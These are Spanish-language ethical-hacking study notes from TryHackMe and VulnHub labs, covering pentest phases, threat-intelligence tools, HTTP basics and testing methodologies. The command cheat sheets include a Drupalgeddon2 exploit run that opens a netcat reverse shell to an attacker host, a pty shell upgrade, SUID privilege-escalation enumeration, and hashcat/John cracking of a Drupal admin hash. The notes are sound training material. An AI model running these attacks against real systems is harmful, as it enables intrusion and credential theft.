## Reconocimiento Pasivo

### Descargar favicon y calcular su hash MD5
```
curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum
```
Este comando no interactúa directamente con el sistema objetivo, solo descarga un recurso público.

## Reconocimiento Activo

### Enviar solicitud GET con salida detallada
```
curl http://10.10.245.129/ -v
```

### Descubrir contenido web con FFUF
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://10.10.245.129/FUZZ
```

### Escanear contenido web con DIRB
```
dirb http://10.10.245.129/ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

### Fuerza bruta de directorios con Gobuster
```
gobuster dir --url http://10.10.245.129/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```



-----
# Herramientas de Inteligencia de Amenazas (Threat Intel Tools)

La **Inteligencia de Amenazas** consiste en analizar datos e información utilizando herramientas y técnicas para generar patrones significativos que ayuden a mitigar riesgos asociados con amenazas existentes o emergentes dirigidas a organizaciones, industrias, sectores o gobiernos.

Para mitigar los riesgos, es importante responder preguntas como:

- ¿Quién te está atacando?
- ¿Cuál es su motivación?
- ¿Cuáles son sus capacidades?
- ¿Qué artefactos e indicadores de compromiso (IoCs) debes buscar?

## Clasificaciones de Inteligencia de Amenazas
La inteligencia de amenazas busca comprender la relación entre el entorno operativo y el adversario. Se clasifica en:

1. **Inteligencia Estratégica**: Proporciona información de alto nivel sobre el panorama de amenazas de la organización, identificando áreas de riesgo basadas en tendencias, patrones y amenazas emergentes que podrían impactar las decisiones empresariales.

2. **Inteligencia Técnica**: Se centra en evidencias y artefactos utilizados por un adversario durante un ataque. Los equipos de respuesta a incidentes pueden usar esta información para crear una línea base del ataque y desarrollar mecanismos de defensa.

3. **Inteligencia Táctica**: Evalúa las tácticas, técnicas y procedimientos (TTPs) de los adversarios. Este tipo de inteligencia fortalece los controles de seguridad y aborda vulnerabilidades mediante investigaciones en tiempo real.

4. **Inteligencia Operativa**: Analiza los motivos e intenciones específicas de un adversario para realizar un ataque. Los equipos de seguridad pueden usar esta inteligencia para identificar activos críticos dentro de la organización (personas, procesos y tecnologías) que podrían ser objetivos.

## Herramientas de Inteligencia de Amenazas

### 1. [urlscan.io](https://urlscan.io/)
Una herramienta para analizar y visualizar cómo una URL interactúa en la web. Útil para identificar comportamientos sospechosos de sitios web.

### 2. [abuse.ch](https://abuse.ch/)
Proporciona listas de amenazas y artefactos maliciosos como dominios, IPs e indicadores de compromiso (IoCs) relacionados con malware y ciberataques.

### 3. [PhishTool](https://www.phishtool.com/ >> https://app.phishtool.com/)
Plataforma para analizar correos electrónicos sospechosos, URLs y detectar intentos de phishing de manera efectiva.

### 4. [CyberChef](https://cyberchef.io/)
Herramienta versátil para analizar datos, decodificar información, manipular archivos y realizar operaciones criptográficas de manera sencilla.

### 5. [Talos Intelligence](https://talosintelligence.com/)
Base de datos de inteligencia de amenazas que proporciona información sobre dominios, IPs y amenazas emergentes.

## Comandos Útiles

### Defanging de una IP o URL
Transformar direcciones para evitar ejecuciones accidentales. Ejemplo:

```
204[.]93[.]183[.]11
```

### Generar un hash SHA-256 para analizar malware
Utiliza el comando:

```
sha256sum <nombre_del_archivo>
```

Usa el hash generado para obtener información relacionada con malware en bases de datos como VirusTotal o similares.

---


# Notas sobre Seguridad y Hacking Ético

## Fases de un Test de Intrusión

Cada una de las fases en un test de intrusión es fundamental para garantizar un análisis estructurado y efectivo de la seguridad de los sistemas objetivo. Estas etapas están interrelacionadas y contribuyen al éxito global del proceso, desde la preparación inicial hasta la entrega de un informe detallado. A continuación, se detallan las fases y su importancia:

### 1. Reconocimiento Pasivo (Footprinting)
- **Objetivo**: Recabar información inicial sin alertar al objetivo. Esto permite identificar posibles puntos de entrada y preparar estrategias de ataque.
- **Importancia**:
  - Es la base para todas las fases posteriores, ya que proporciona una visión general de la superficie de ataque.
  - Minimiza los riesgos al ser una fase no intrusiva, evitando que el objetivo detecte actividades sospechosas.
- **Relación con otras fases**:
  - La información recolectada aquí alimenta directamente la fase de enumeración activa.

### 2. Enumeración o Reconocimiento Activo (Fingerprinting)
- **Objetivo**: Interactuar directamente con los sistemas para recopilar detalles técnicos más precisos.
- **Importancia**:
  - Identifica vulnerabilidades específicas y servicios abiertos que pueden ser explotados.
  - Permite validar la información recolectada en el reconocimiento pasivo.
- **Relación con otras fases**:
  - Proporciona datos técnicos que serán utilizados en la fase de explotación para lanzar ataques específicos.

### 3. Explotación (Footholding)
- **Objetivo**: Aprovechar vulnerabilidades para obtener acceso inicial a los sistemas.
- **Importancia**:
  - Permite validar la existencia de vulnerabilidades reales y su impacto en el sistema.
  - Es el paso donde se demuestra la posibilidad de comprometer la seguridad del objetivo.
- **Relación con otras fases**:
  - Depende de los hallazgos obtenidos en las fases de reconocimiento.
  - Los resultados de esta fase son esenciales para planificar las actividades de post-explotación.

### 4. Post-Explotación
- **Objetivo**: Consolidar el acceso y evaluar el impacto de un compromiso exitoso.
- **Importancia**:
  - Permite medir el alcance del ataque, como la posibilidad de escalar privilegios o moverse lateralmente dentro de la red.
  - Ayuda a comprender las implicaciones prácticas de las vulnerabilidades explotadas.
- **Relación con otras fases**:
  - Extiende los resultados de la explotación para evaluar posibles amenazas adicionales y movimientos futuros del atacante.

### 5. Documentación
- **Objetivo**: Presentar los hallazgos y recomendaciones de manera clara y estructurada.
- **Importancia**:
  - Proporciona a la organización información accionable para mitigar vulnerabilidades y mejorar la seguridad.
  - Asegura la transparencia del proceso y ayuda a justificar las medidas de seguridad necesarias.
- **Relación con otras fases**:
  - Recoge información de todas las fases anteriores para crear un informe completo y detallado.
  - Incluye tanto el impacto técnico como un resumen ejecutivo para la toma de decisiones a nivel organizativo.

### 1. Reconocimiento Pasivo (Footprinting)
- Recabar información de fuentes públicas, como redes sociales, motores de búsqueda y registros públicos.
- Fase no intrusiva, donde no se interactúa directamente con el objetivo.
- Técnicas comunes: OSINT (Open Source Intelligence), que incluye herramientas como Maltego o Shodan.

### 2. Enumeración o Reconocimiento Activo (Fingerprinting)
- Recopilación de información de manera activa, interactuando directamente con los sistemas objetivo.
- Fase intrusiva (requiere permiso explícito).
- Actividades comunes:
  - Escaneo de puertos abiertos usando herramientas como Nmap.
  - Identificación de servicios y versiones.
  - Descubrimiento de vulnerabilidades utilizando scanners como Nessus o OpenVAS.

### 3. Explotación (Footholding)
- Análisis de posibles vectores de ataque basándose en la información obtenida previamente.
- Aprovechamiento de vulnerabilidades específicas, errores de configuración y contraseñas débiles.
- Uso de herramientas como Metasploit para lanzar exploits.

### 4. Post-Explotación
- Acceso a los sistemas del objetivo y consolidación del acceso.
- Comprobación y escalación de privilegios para obtener mayores derechos sobre el sistema.
- Análisis de posibles saltos a otros sistemas dentro de la red comprometida (movimiento lateral).

### 5. Documentación
- Elaboración de un informe detallado con los hallazgos y recomendaciones.
- El informe incluye:
  - **Informe ejecutivo**: Resumen de alto nivel para stakeholders no técnicos.
  - **Informe técnico**: Detalles técnicos de los métodos, herramientas y resultados obtenidos.

---

## Equipos de Seguridad

### Red Team
- Realiza labores de seguridad ofensiva, simulando ataques reales para evaluar la seguridad de una organización.
- Actividades típicas:
  - Simulaciones de phishing: Realización de campañas controladas de correos electrónicos maliciosos para evaluar la concienciación de los empleados.
  - Pruebas de penetración internas y externas: Identificación de vulnerabilidades dentro de la infraestructura interna o desde el perímetro externo de la organización.
  - Evaluaciones de ingeniería social: Intentos de manipular a los empleados para obtener acceso no autorizado o información confidencial.
  - Simulación de ataques avanzados (APT): Ejecución de escenarios similares a los utilizados por atacantes sofisticados para comprometer sistemas críticos.
  - Análisis de vector de ataque: Evaluación detallada de rutas posibles que un atacante podría usar para acceder a recursos valiosos de la organización.

### Blue Team
- Realiza labores de seguridad defensiva, centrándose en proteger, detectar y responder a amenazas.
- Responsabilidades:
  - Respuesta a incidentes de seguridad.
  - Análisis forense digital para investigar brechas de seguridad.
  - Investigación de amenazas emergentes.
  - Bastionado de sistemas y creación de políticas de seguridad.
  - Monitorización activa de redes y sistemas para detectar actividades sospechosas.

---

## Glosario
- **APT**: Advanced Persistent Threat. Grupo o individuo que lleva a cabo ataques dirigidos y sostenidos contra un objetivo.
- **DDoS**: Distributed Denial of Service. Ataque que busca saturar un servicio o red para dejarlo inoperativo.
- **MitM**: Man in the Middle. Ataque donde el atacante intercepta y posiblemente altera la comunicación entre dos partes.
- **Spoofing**: Suplantación de identidad o de dispositivos en una red.
- **Sniffing**: Escucha pasiva de tráfico en una red para capturar información.
- **Rogue AP**: Puntos de acceso maliciosos diseñados para engañar a los usuarios y robar datos.

---

## Prácticas y Recursos

### Plataformas de Práctica
- [INCIBE Academia Hacker](https://www.incibe.es/ed2026/talento-hacker/academia-hacker): Formación en ciberseguridad para principiantes y avanzados.
- [Una al Mes](https://unaalmes.hispasec.com/): Retos mensuales de ciberseguridad.
- [PicoCTF](https://picoctf.org/): Competencias tipo CTF (Capture The Flag) orientadas a estudiantes.
- [Hack The Box](https://www.hackthebox.com/): Plataforma para practicar hacking ético en entornos simulados.
- [TryHackMe](https://tryhackme.com/r/dashboard): Lecciones interactivas y laboratorios prácticos para aprender ciberseguridad.
- [VulnHub](https://www.vulnhub.com/): Máquinas virtuales vulnerables para prácticas.
- [HackMyVM](https://hackmyvm.eu/): Máquinas virtuales para entrenar habilidades de hacking.
- [Offensive Security Labs](https://www.offsec.com/labs/): Laboratorios avanzados para preparación de certificaciones como OSCP.

### Recursos para OSINT
- [jimpl.com](https://jimpl.com/): Herramientas y guías para la investigación con OSINT.

### Recursos para TOR
- [Dark Web Tools](https://github.com/tjnull/TJ-OSINT-Notebook/blob/main/Raw%20Markdown/Resources/Tools/Dark%20Web.md): Listado de herramientas para explorar la Dark Web.
- [Kali Docs sobre TOR](https://www.kali.org/docs/tools/tor/): Documentación oficial sobre TOR en Kali Linux.

### Otros Recursos Relevantes
- [Preparación OSCP por TJnull](https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html): Guía para prepararse para el examen OSCP.
- [OSCP Reborn 2023 por John J. Hacking](https://johnjhacking.com/blog/oscp-reborn-2023/): Actualizaciones sobre el examen OSCP.
- [The Cyber Mentor (YouTube)](https://www.youtube.com/c/thecybermentor): Canal educativo sobre ciberseguridad.
- [HackTricks Book](https://book.hacktricks.wiki/en/index.html): Manual con trucos y técnicas de hacking.
- [HackerSploit (YouTube)](https://www.youtube.com/@HackerSploit): Tutoriales y guías prácticas de hacking ético.
- [John Hammond (YouTube)](https://www.youtube.com/@_JohnHammond): Análisis de retos de seguridad y guías.
- [El lado del mal (Blog)](https://www.elladodelmal.com/): Blog en español sobre hacking y ciberseguridad.
- [Hacking Articles](https://www.hackingarticles.in/ctf-challenges-walkthrough/): Tutoriales paso a paso para resolver retos CTF.

---

## Comandos Útiles

### HTTP Requests y Fuzzing
```bash
curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum
curl http://10.10.245.129/ -v

ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://10.10.245.129/FUZZ
dirb http://10.10.245.129/ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
gobuster dir --url http://10.10.245.129/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```
- **ffuf**: Herramienta para realizar fuzzing en directorios o parámetros de aplicaciones web.
- **dirb** y **gobuster**: Utilizadas para descubrir directorios y archivos ocultos en servidores web.

### Cracking y Hashing
#### Hashcat
```bash
hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt
```
- **Hashcat**: Herramienta avanzada para descifrar hashes utilizando diccionarios o fuerza bruta.

#### Generar y Comparar Hashes
```bash
# MD5
echo -n "LearnTheHashFunction" | md5sum

# SHA256
echo -n "ThisIsAMoreSecureHashFunction" | sha256sum

# Encadenar Hashes
echo -n "ThisIsAMoreSecureHashFunction" | sha256sum | awk '{printf $1}' | md5sum
```

### Base64
- **¿Qué es Base64?**:
  - Base64 es un esquema de codificación que convierte datos binarios en texto ASCII. Esto se logra representando los datos en un formato legible y seguro para transmisiones de texto, como correos electrónicos o sistemas que no admiten caracteres binarios.
  - Base64 no cifra los datos, simplemente los codifica. Por lo tanto, cualquier persona con acceso al texto codificado puede decodificarlo fácilmente.
  - Este método es común para codificar datos binarios, como imágenes o archivos, en sistemas que esperan texto plano.

- **Casos de uso comunes**:
  - Adjuntar archivos en correos electrónicos MIME.
  - Codificar credenciales en encabezados HTTP básicos (Basic Authentication).
  - Representar certificados y claves criptográficas en formato PEM.

- **Decodificar**:
```bash
base64 -d base64-c6d8efd649ad94af23eb2bd2af63edd0.txt
```
- Nota: Cuando codificas algo en base64 **NO lo estás cifrando**, solo lo codificas.
- Ejemplo:
```bash
echo -n "recuerdaquebase64NOescifrar" | md5sum
# Resultado: cf9df460535b4ec175a464c6c120d3fe
```

Libro: Hacking ético
LABORATORIOS DE INTRODUCCIÓN AL HACKING EN
TRYHACKME
Descripción
En la Unidad 1 hemos visto los conceptos básicos del hacking ético.
Para profundizar en los contenidos prácticos aprendidos anteriormente, se propone realizar una serie de
laboratorios guiados disponibles en la plataforma TryHackMe, sobre estos contenidos.
Los laboratorios que hay que realizar son los siguientes:
Introducción y fases del hacking ético:     
• Principles of Security: https://tryhackme.com/room/principlesofsecurity
• Security Awareness: https://tryhackme.com/room/securityawarenessintro
• Common Attacks: https://tryhackme.com/room/commonattacks
• Intro to Offensive Security: https://tryhackme.com/room/introtooffensivesecurity
• Pentesting fundamentals: https://tryhackme.com/room/pentestingfundamentals
• Red Team Fundamentals: https://tryhackme.com/room/redteamfundamentals
• Red Team Engagements: https://tryhackme.com/room/redteamengagements
• MITRE: https://tryhackme.com/room/mitre


## 1. Script de Git en Bash

```bash
#!/bin/bash

# Cambia al directorio deseado
cd 'C:\Users\renek\OneDrive\Documentos\P Y T  H O N\'

# Ejecuta comandos de Git
git add .
git commit -m 'Update changes from PC'
git push origin main --force
```

### Descripción:
- `cd`: Cambia al directorio donde se encuentran los archivos del proyecto.
- `git add .`: Agrega todos los archivos modificados o nuevos al área de preparación (staging).
- `git commit -m 'mensaje'`: Confirma los cambios con un mensaje descriptivo.
- `git push origin main --force`: Envía los cambios al repositorio remoto en la rama `main`, usando `--force` para sobrescribir cambios si es necesario.

---

## 2. Acceso a un Bash del Sistema con Meterpreter

Para obtener acceso a un bash del sistema a través de Meterpreter, se usa el siguiente comando:

```bash
python -c "import pty; pty.spawn('/bin/bash')"
```

### Descripción:
- `python -c`: Ejecuta el código Python directamente desde la línea de comandos.
- `import pty`: Importa el módulo `pty` que permite interactuar con pseudoterminales.
- `pty.spawn('/bin/bash')`: Genera un shell interactivo dentro del entorno comprometido.

---

## 3. Uso de Hashcat para Romper Hashes

```cmd
C:\Users\username\Downloads\AppsInstalled\hashcat-6.2.6\hashcat-6.2.6>hashcat -m 7900 admin_hash.txt rockyou.txt
```

### Descripción:
- `hashcat`: Herramienta para romper hashes utilizando diferentes ataques.
- `-m 7900`: Especifica el tipo de hash a romper (7900 corresponde a hashes de Drupal 7).
- `admin_hash.txt`: Archivo que contiene el hash a descifrar.
- `rockyou.txt`: Diccionario de palabras para realizar el ataque de fuerza bruta.

---

## 4. Enumeración y Cracking de Hashes

```bash
find / -perm -u=s 2>/dev/null
```

### Descripción:
- `find / -perm -u=s`: Busca archivos con permisos `SUID`, que pueden permitir la elevación de privilegios.
- `2>/dev/null`: Oculta errores de acceso a ciertos directorios.

```bash
john --format=drupal7 --wordlist=/usr/share/wordlists/rockyou.txt ~/CTFs/VulnHub/DC-1/admin_hash.txt
```

### Descripción:
- `john`: Herramienta `John the Ripper` para descifrar hashes.
- `--format=drupal7`: Indica que el hash pertenece a Drupal 7.
- `--wordlist=rockyou.txt`: Especifica un diccionario de palabras para el ataque.
- `admin_hash.txt`: Archivo con el hash a descifrar.

```bash
whatweb <ip> | awk '{gsub(/], /, "],\n" ); print}'
```

### Descripción:
- `whatweb <ip>`: Escanea un sitio web para detectar tecnologías utilizadas.
- `awk '{gsub(/], /, "],\n" ); print}'`:
  - `awk`: Herramienta para el procesamiento de texto.
  - `gsub(/], /, "],\n" )`: Reemplaza todas las coincidencias de `], ` por `],\n`, insertando un salto de línea.
  - `print`: Imprime la salida formateada, facilitando la legibilidad.
  - En conjunto, este comando reformatea la salida de `whatweb`, organizando mejor la información detectada.

---

## 5. Reverse Shell

### Atacante:
```bash
python2 drupalgeddon2.py -h http://10.0.2.5 -c 'nohup nc -e /bin/bash 10.0.2.15 9000 &'
```

### Descripción:
- `python2 drupalgeddon2.py`: Exploita una vulnerabilidad en Drupal para ejecutar comandos remotos.
- `-h http://10.0.2.5`: Especifica la URL del objetivo.
- `-c 'nohup nc -e /bin/bash 10.0.2.15 9000 &'`: Establece una conexión inversa con `netcat`.
- `nohup`: Permite que el proceso continúe ejecutándose en segundo plano.
- `nc -e /bin/bash 10.0.2.15 9000`: Conecta la shell a la máquina del atacante en el puerto `9000`.

### Objetivo:
```bash
nc -lnvp 9000
```

### Descripción:
- `nc -lnvp 9000`: Escucha conexiones entrantes en el puerto `9000`.
  - `-l`: Modo de escucha.
  - `-n`: No usa resolución de DNS.
  - `-v`: Modo detallado (verbose).
  - `-p 9000`: Especifica el puerto.

---

# HTTP en Detalle

## ¿Qué es HTTP? (HyperText Transfer Protocol)
HTTP es un protocolo desarrollado entre 1989 y 1991 por Tim Berners-Lee y su equipo. Se utiliza para la comunicación con servidores web para la transmisión de datos como HTML, imágenes y videos.

## ¿Qué es HTTPS? (HyperText Transfer Protocol Secure)
HTTPS es la versión segura de HTTP. Los datos están cifrados para evitar que terceros los intercepten y para asegurar que la comunicación se realiza con el servidor legítimo.

## ¿Qué es una URL? (Uniform Resource Locator)
Una URL es una instrucción sobre cómo acceder a un recurso en Internet. Sus componentes son:

| Componente     | Descripción |
|---------------|------------|
| **Esquema**   | Define el protocolo (HTTP, HTTPS, FTP, etc.). |
| **Usuario**   | Autenticación opcional con usuario y contraseña. |
| **Host**      | Nombre de dominio o dirección IP del servidor. |
| **Puerto**    | Número de puerto para la conexión (80 para HTTP, 443 para HTTPS). |
| **Ruta**      | Ubicación o nombre del recurso solicitado. |
| **Query String** | Parámetros adicionales enviados en la solicitud. |
| **Fragmento** | Referencia a una sección específica dentro de la página. |

## Realización de una Solicitud HTTP
Ejemplo de solicitud HTTP:
```http
GET / HTTP/1.1
Host: tryhackme.com
User-Agent: Mozilla/5.0 Firefox/87.0
Referer: https://tryhackme.com/
```
Explicación:
- **GET /** → Método HTTP para solicitar la página de inicio.
- **Host** → Indica el dominio solicitado.
- **User-Agent** → Identifica el navegador usado.
- **Referer** → Indica la URL de referencia.

### Ejemplo de Respuesta HTTP
```http
HTTP/1.1 200 OK
Server: nginx/1.15.8
Date: Fri, 09 Apr 2021 13:34:03 GMT
Content-Type: text/html
Content-Length: 98

<html>
<head><title>TryHackMe</title></head>
<body>Welcome To TryHackMe.com</body>
</html>
```
Explicación:
- **HTTP/1.1 200 OK** → Indica éxito en la solicitud.
- **Server** → Software del servidor.
- **Date** → Fecha y hora de la respuesta.
- **Content-Type** → Tipo de contenido devuelto.
- **Content-Length** → Tamaño del contenido devuelto.

## Métodos HTTP
| Método  | Descripción |
|---------|------------|
| **GET** | Recuperar información. |
| **POST** | Enviar datos al servidor. |
| **PUT** | Actualizar información. |
| **DELETE** | Eliminar un recurso. |

## Códigos de Estado HTTP
| Rango  | Descripción |
|--------|------------|
| **100-199** | Respuestas informativas. |
| **200-299** | Éxito en la solicitud. |
| **300-399** | Redirección a otra URL. |
| **400-499** | Errores del cliente. |
| **500-599** | Errores del servidor. |

### Códigos de Estado Comunes
| Código | Descripción |
|--------|------------|
| **200** | OK - Solicitud exitosa. |
| **201** | Created - Recurso creado. |
| **301** | Moved Permanently - Página movida permanentemente. |
| **302** | Found - Redirección temporal. |
| **400** | Bad Request - Solicitud incorrecta. |
| **401** | Unauthorized - Requiere autenticación. |
| **403** | Forbidden - Acceso denegado. |
| **404** | Not Found - Recurso no encontrado. |
| **500** | Internal Server Error - Error en el servidor. |
| **503** | Service Unavailable - Servidor no disponible. |

## Encabezados HTTP
### Encabezados Comunes en las Solicitudes
| Encabezado | Descripción |
|-----------|------------|
| **Host** | Indica el dominio solicitado. |
| **User-Agent** | Identifica el navegador. |
| **Content-Length** | Indica la longitud del contenido enviado. |
| **Accept-Encoding** | Especifica métodos de compresión soportados. |
| **Cookie** | Datos de sesión enviados al servidor. |

### Encabezados Comunes en las Respuestas
| Encabezado | Descripción |
|-----------|------------|
| **Set-Cookie** | Información a almacenar en el cliente. |
| **Cache-Control** | Controla la caché del navegador. |
| **Content-Type** | Tipo de contenido de la respuesta. |
| **Content-Encoding** | Método de compresión utilizado. |

## Cookies
Las cookies son utilizadas principalmente para autenticación en sitios web. Suelen almacenarse como tokens en lugar de contraseñas en texto claro. Se pueden visualizar a través de las herramientas de desarrollo del navegador en la pestaña "Network".





---

# **Metodologías de Pruebas de Penetración**

Las pruebas de penetración pueden tener una amplia variedad de objetivos y alcances. Debido a esto, no existe una metodología única que se adapte a todos los casos.

La secuencia de pasos seguida por un tester durante una prueba de penetración se conoce como **metodología**. Una metodología efectiva debe adaptarse a la situación específica. Por ejemplo, una metodología diseñada para probar la seguridad de una aplicación web no sería práctica para evaluar la seguridad de una red.

## **Etapas Generales de una Prueba de Penetración**

Todas las metodologías estándar de la industria siguen una estructura similar basada en las siguientes etapas:

| **Etapa**               | **Descripción** |
|-------------------------|----------------|
| **Recopilación de Información** | Recopilación de la mayor cantidad de información accesible públicamente sobre un objetivo u organización (por ejemplo, OSINT e investigación). Nota: Esto no implica escanear sistemas. |
| **Enumeración/Escanerización** | Identificación de aplicaciones y servicios que se ejecutan en los sistemas. Por ejemplo, descubrir un servidor web que podría ser vulnerable. |
| **Explotación** | Aprovechamiento de las vulnerabilidades descubiertas en un sistema o aplicación. Esto puede involucrar el uso de exploits públicos o la explotación de la lógica de la aplicación. |
| **Escalada de Privilegios** | Una vez que se ha obtenido acceso a un sistema (punto de apoyo), esta etapa implica ampliar el acceso. La escalada puede ser horizontal (acceder a otra cuenta en el mismo grupo de permisos) o vertical (acceder a otro grupo de permisos, como administrador). |
| **Post-explotación** | Incluye diversas actividades: (1) Pivoting (descubrir otros hosts atacables), (2) Recopilación adicional de información, (3) Ocultar huellas, (4) Informes. |

---

## **Tipos de Pruebas de Penetración**

Existen tres enfoques principales para evaluar la seguridad de una aplicación o servicio. El entendimiento del objetivo determinará el nivel de pruebas realizadas en un compromiso de pruebas de penetración.

### **Pruebas de Caja Negra (Black-Box Testing)**

En este enfoque, el tester no tiene conocimiento de los componentes internos de la aplicación o servicio. El tester actúa como un usuario común, probando la funcionalidad e interacción de la aplicación al interactuar con la interfaz, los botones y verificando si se logra el resultado esperado.

- No requiere conocimientos de programación.
- Se enfoca en la funcionalidad del software.
- Aumenta significativamente el tiempo dedicado a la recopilación de información y la enumeración para comprender la superficie de ataque del objetivo.

### **Pruebas de Caja Gris (Grey-Box Testing)**

Esta es la metodología más comúnmente utilizada para pruebas de penetración, combinando elementos de las pruebas de Caja Negra y Caja Blanca. El tester tiene un conocimiento limitado de los componentes internos de la aplicación, pero interactúa con ella como si fuera un escenario de Caja Negra, utilizando el conocimiento proporcionado para abordar los problemas encontrados.

- Reduce el tiempo de prueba en comparación con las pruebas de Caja Negra.
- A menudo elegida para superficies de ataque altamente endurecidas.

### **Pruebas de Caja Blanca (White-Box Testing)**

Este enfoque es típicamente utilizado por desarrolladores de software que tienen conocimientos de programación y lógica de aplicaciones. El tester examina los componentes internos de la aplicación para asegurarse de que funciones específicas operen correctamente y dentro de los límites de tiempo razonables.

- El tester tiene conocimiento total de la aplicación y su comportamiento esperado.
- Más exhaustiva pero también más lenta que las pruebas de Caja Negra.
- Asegura una validación completa de la superficie de ataque.

---

## **Metodologías de la Industria**

A continuación, se presentan algunos marcos de trabajo ampliamente utilizados en pruebas de penetración.

### **1. OSSTMM (Open Source Security Testing Methodology Manual)**

Este manual proporciona un marco detallado para probar la seguridad de sistemas, software, aplicaciones, comunicaciones y el aspecto humano de la ciberseguridad. Se enfoca en cómo estos elementos interactúan, incluyendo metodologías para:

- **Telecomunicaciones** (teléfonos, VoIP, etc.)
- **Redes cableadas**
- **Comunicaciones inalámbricas**

| **Ventajas** | **Desventajas** |
|-------------|---------------|
| Cubre diversas estrategias de prueba en profundidad. | El marco es complejo, altamente detallado y utiliza definiciones únicas. |
| Incluye estrategias de prueba para objetivos específicos (telecomunicaciones y redes). | - |
| Flexible, adaptándose a las necesidades organizacionales. | - |
| Establece un estándar universal para sistemas y aplicaciones. | - |

---

### **2. OWASP (Open Web Application Security Project)**

Este marco impulsado por la comunidad está diseñado específicamente para probar la seguridad de aplicaciones y servicios web. Publica informes periódicos sobre las **10 vulnerabilidades más comunes**, enfoques de prueba y recomendaciones de mitigación.

| **Ventajas** | **Desventajas** |
|-------------|---------------|
| Fácil de entender y aplicar. | Puede no estar claro qué tipo de vulnerabilidad tiene una aplicación web (algunas pueden solaparse). |
| Frecuentemente actualizado. | No proporciona recomendaciones para ciclos de vida específicos del desarrollo de software. |
| Cubre todas las etapas de compromiso: pruebas, informes y remediación. | No tiene acreditaciones oficiales como CHECK. |
| Se especializa en aplicaciones y servicios web. | - |

---

### **3. NIST Cybersecurity Framework 1.1**

Este marco ampliamente utilizado ayuda a las organizaciones a mejorar los estándares de ciberseguridad y gestionar las amenazas cibernéticas. Es particularmente popular en infraestructuras críticas (por ejemplo, plantas de energía) y sectores comerciales.

| **Ventajas** | **Desventajas** |
|-------------|---------------|
| Se estima que será utilizado por el 50% de las organizaciones de EE.UU. para 2020. | Existen múltiples versiones, lo que dificulta seleccionar la adecuada para una organización. |
| Establece estándares detallados para mitigar las amenazas cibernéticas. | Las políticas de auditoría débiles dificultan el seguimiento de las brechas de seguridad. |
| Frecuentemente actualizado. | No contempla la computación en la nube, que está ganando popularidad rápidamente. |
| Proporciona acreditación para las organizaciones que usan el marco. | - |
| Está diseñado para implementarse junto con otros marcos. | - |

---

### **4. NCSC CAF (Cyber Assessment Framework)**

Este marco evalúa el riesgo de amenazas cibernéticas en organizaciones consideradas **proveedores de servicios críticos**, como infraestructuras y banca. Se basa en 14 principios clave, incluyendo:

- **Seguridad de los datos**
- **Seguridad de los sistemas**
- **Control de identidad y acceso**
- **Resiliencia**
- **Monitoreo**
- **Planificación de respuesta y recuperación**

| **Ventajas** | **Desventajas** |
|-------------|---------------|
| Desarrollado por una agencia gubernamental de ciberseguridad. | Aún es nuevo, por lo que las organizaciones han tenido un tiempo limitado para adaptarse. |
| Proporciona acreditación. | Se basa en principios más que en reglas explícitas, lo que hace que la implementación sea más abstracta. |
| Cubre una amplia gama de aspectos de seguridad y respuesta a incidentes. | - |

---


## Comandos Útiles para Ciberseguridad, Pentesting y Hacking Ético

Esta sección contiene comandos útiles para diversas tareas en ciberseguridad, pentesting y hacking ético, con una breve descripción de su función.

### HTTP Requests y Fuzzing

*   **curl**: Realizar peticiones HTTP para interactuar con servidores web.
    

bash
    curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum  # Obtiene el hash MD5 de un recurso web.
    curl http://10.10.245.129/ -v  # Realiza una petición HTTP y muestra información detallada.


*   **ffuf**: Realizar fuzzing en directorios y parámetros de aplicaciones web para descubrir vulnerabilidades.
    

bash
    ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://10.10.245.129/FUZZ  # Fuzzing de la URL con una lista de palabras.


*   **dirb**, **gobuster**: Descubrir directorios y archivos ocultos en servidores web mediante fuerza bruta.
    

bash
    dirb http://10.10.245.129/ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt  # Busca directorios en el sitio web.
    gobuster dir --url http://10.10.245.129/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt  # Similar a dirb, pero con más opciones.



### Cracking y Hashing

*   **Hashcat**: Descifrar hashes de contraseñas utilizando diferentes métodos (diccionario, fuerza bruta, etc.).
    

bash
    hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt  # Descifra un hash MD5 con sal usando un diccionario.


*   **Generar Hashes**: Calcular hashes MD5 y SHA256 para verificar la integridad de archivos o datos.
    

bash
    echo -n "LearnTheHashFunction" | md5sum  # Calcula el hash MD5 de la cadena.
    echo -n "ThisIsAMoreSecureHashFunction" | sha256sum  # Calcula el hash SHA256 de la cadena.
    echo -n "ThisIsAMoreSecureHashFunction" | sha256sum | awk '{printf $1}' | md5sum  # Calcula el hash MD5 del hash SHA256.


*   **John the Ripper**: Descifrar hashes de contraseñas utilizando diferentes formatos y diccionarios.
    

bash
    john --format=drupal7 --wordlist=/usr/share/wordlists/rockyou.txt ~/CTFs/VulnHub/DC-1/admin_hash.txt  # Descifra un hash de Drupal 7 usando un diccionario.



### Base64

*   **Codificación y Decodificación Base64:** Codificar datos binarios en texto ASCII para facilitar su transmisión.
    

bash
    base64 -d base64-c6d8efd649ad94af23eb2bd2af63edd0.txt  # Decodifica una cadena Base64.
    echo -n "recuerdaquebase64NOescifrar" | md5sum  # Muestra que Base64 no cifra, solo codifica.
    # Resultado: cf9df460535b4ec175a464c6c120d3fe



### Scripting

*   **Script de Git en Bash:** Automatizar comandos de Git para la gestión de versiones.
    

bash
    #!/bin/bash

    # Cambia al directorio deseado
    cd 'C:\Users\renek\OneDrive\Documentos\P Y T  H O N\'

    # Ejecuta comandos de Git
    git add .
    git commit -m 'Update changes from PC'
    git push origin main --force



